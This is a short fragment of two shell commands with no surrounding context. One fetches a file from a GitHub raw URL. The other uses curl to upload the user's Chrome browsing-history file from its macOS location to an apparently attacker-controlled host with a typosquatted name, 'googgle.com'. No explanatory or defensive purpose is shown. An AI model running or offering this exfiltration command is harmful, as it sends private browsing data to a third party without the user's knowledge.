...
wget https://raw.githubusercontent.com/chitti-s/test/main/file1

curl -T ~/Library/Application\ Support/Google/Chrome/Default/History http://qwewereterterterttre.googgle.com
